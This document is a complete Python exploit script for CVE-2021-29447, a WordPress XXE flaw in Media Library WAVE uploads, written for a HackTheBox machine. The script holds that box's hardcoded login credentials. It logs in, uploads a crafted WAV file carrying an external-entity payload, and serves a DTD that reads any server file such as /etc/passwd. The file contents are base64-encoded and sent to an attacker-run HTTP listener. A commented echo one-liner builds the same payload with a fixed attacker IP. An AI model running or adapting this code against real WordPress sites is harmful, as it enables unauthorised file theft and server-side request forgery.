#!/usr/bin/env python3

"""
Author: poorduck
Description: in wordpress version 5.6.0 to 5.7.0 where an an authenticated user with the ability to upload files
             in the "Media Library" can upload a malicious WAVE file that could lead to remote arbitrary file disclosure
             and server-side request forgery (SSRF).
CVE: CVE-2021-29447 https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/

Usage: python3 script.py [FILEPATH]
                        where FILEPATH is the full path of file want to read.

Example: python script.py '/etc/passwd'

Pre-requirements:
    - Remote host should be added in the "/etc/hosts" file i.e "10.10.11.186 metapress.htb"
    - HackTheBox VPN is connected on "tun0" interface
"""

import requests
from bs4 import BeautifulSoup
from re import findall
import threading
import socketserver
import http.server
from base64 import b64decode
import netifaces as ni
from os import path
from sys import argv

session = requests.Session()
rhost = "http://metapress.htb"

# metapress wordpress creds
username = 'manager'
password = 'partylikearockstar'

# Enable burp proxy
# session.proxies = {"http": "http://127.0.0.1:8080"}

# Get HackTheBox vpn ip from tun0 interface
try:
    htb_vpn_inf = 'tun0'
    lhost = ni.ifaddresses(htb_vpn_inf)[ni.AF_INET][0]['addr']
except ValueError as e:
    print("[!] tun0 not found!")
    exit(e)

# Login to wordpress and get auth session
def login_to_wordpress(url, username, password):

    # get the login page to extract the login form fields
    login_page = session.get(f"{url}/wp-login.php")
    soup = BeautifulSoup(login_page.content, 'html.parser')
    form = soup.find('form', {'id': 'loginform'})

    # extract the form fields
    action = form['action']
    inputs = form.find_all('input')
    data = {}
    for i in inputs:
        if i.has_attr('name'):
            data[i['name']] = i['value']

    # update the form fields with the credentials
    data['log'] = username
    data['pwd'] = password

    # submit the form
    response = session.post(action, data=data, allow_redirects=False)

    # check if the login was successful
    if "wordpress_logged_in" in response.headers["Set-Cookie"]:
        print('[+] Login successful!')
        return True
    else:
        print('[-] Login failed.')
        return False

# File upload function in wordpress "Media Library" 
def wp_media_library_upload(url, username, password, filename):

    # log in to WordPress
    login_success = login_to_wordpress(url=url, username=username, password=password)
    if not login_success:
        print("[-] Login failed.")
        return False

    # prepare the image data
    with open(filename, 'rb') as f:
        image_data = f.read()

    # Grab _wpnonce
    res = session.get(f"{url}/wp-admin/media-new.php")
    wp_nonce = findall(r'name="_wpnonce" value="(\w+)"',res.text)
    if len(wp_nonce) == 0 :
        print("[-] Failed to retrieve the _wpnonce")
        return False
    else :
        _wpnonce = wp_nonce[0]
        print("[+] Wp Nonce retrieved successfully ! _wpnonce : " + _wpnonce)

    file_data = {"name": (None, filename), "action": (None, "upload-attachment"), "_wpnonce": (None, _wpnonce), "async-upload": (filename, image_data)}

    # send the POST request to upload the image
    response = session.post(f"{url}/wp-admin/async-upload.php", files=file_data)

    # check if the image was uploaded successfully
    if 'success' in response.text:
        print('[+] Image uploaded successfully!')
        # return True
        pass
    elif response.status_code == '502':
        return True  # XXE triggered.
    else:
        print('[-] Image upload failed.')
        return False 

# http server handler
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    already_processed = set() # Add this line to define the attribute

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory='.', **kwargs)

    def do_GET(self):
        # Check if the request has already been processed
        if self.path in self.already_processed:
            return
        self.already_processed.add(self.path)

        super().do_GET()

        # extract the request path from the log and print it
        request_path = self.requestline
        if "?p=" in request_path:
            recv_data = request_path.split(' ')[1]
            recv_data = findall(r"/\?p=(.*?)$", recv_data)[0]
            base64_decoded = b64decode(recv_data).decode('UTF-8')
            print('[+] Data received:\n\n'+ base64_decoded)

    def log_message(self, format, *args):
        pass

# http server
def run_http_server(port):
    try:
        socketserver.TCPServer.allow_reuse_address = True  # Fixes "[Errno 48] Address already in use" error
        server = socketserver.TCPServer(("", port), MyHttpRequestHandler)
        print("[+] HTTP server started at port", port)
        server.serve_forever()
    except OSError as e:
        print(e)

# Generate required files for the exploit
def init_files(get_this, ip, server_port):
    dtd = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={get_this}">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{ip}:{server_port}/?p=%file;'>" >"""
    fn1 = 'EXPLOIT.dtd'
    with open(fn1, 'w') as f:
        f.write(dtd)
        print(f'[+] File {fn1} written successfully.')

    fn2 = 'payload.wav'
    if not path.isfile(fn2):

        # Create "payload.wav" manually. If generated payload file not work.
        """
        echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.32:8000/EXPLOIT.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
        """

        # hex_value = $(xxd -p -c 1000 payload.wav)
        # formatted_hex = "".join(["\\x" + hex_value[i:i+2] for i in range(0, len(hex_value), 2)])
        
        WAV_BYTES = b"\x52\x49\x46\x46\xb8\x00\x00\x00\x57\x41\x56\x45\x69\x58\x4d\x4c\x7b\x00\x00\x00\x3c\x3f\x78\x6d\x6c\x20"
        WAV_BYTES += b"\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x3f\x3e\x3c\x21\x44\x4f\x43\x54\x59\x50\x45\x20\x41"
        WAV_BYTES += b"\x4e\x59\x5b\x3c\x21\x45\x4e\x54\x49\x54\x59\x20\x25\x20\x72\x65\x6d\x6f\x74\x65\x20\x53\x59\x53\x54\x45"
        WAV_BYTES += bytes(f"\x4d\x20\x27\x68\x74\x74\x70\x3a\x2f\x2f{ip}\x3a{server_port}\x2f", encoding='latin1')
        WAV_BYTES += b"\x45\x58\x50\x4c\x4f\x49\x54\x2e\x64\x74\x64\x27\x3e\x25\x72\x65\x6d\x6f\x74\x65\x3b\x25\x69\x6e\x69\x74"
        WAV_BYTES += b"\x3b\x25\x74\x72\x69\x63\x6b\x3b\x5d\x3e\x00"

        with open(fn2, 'wb') as f:
            f.write(WAV_BYTES)

    return fn1, fn2


if __name__ == '__main__':

    srv_port = 8000
    dtd_fn = ""

    try:
        filepath = argv[1]
    except IndexError as e:
        exit("Usage: script.py [FILEPATH]")

    try:
        dtd_fn, payload_fn = init_files(get_this=filepath, ip=lhost, server_port=srv_port)

        # start the HTTP server in a separate thread
        server_thread = threading.Thread(target=run_http_server, args=(srv_port,))
        server_thread.daemon = True
        server_thread.start()

        # upload the image to WordPress
        success = wp_media_library_upload(url=rhost, username=username, password=password, filename=payload_fn)

    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
    finally:
        if dtd_fn:
            import os; os.remove(dtd_fn) if os.path.isfile(dtd_fn) else None
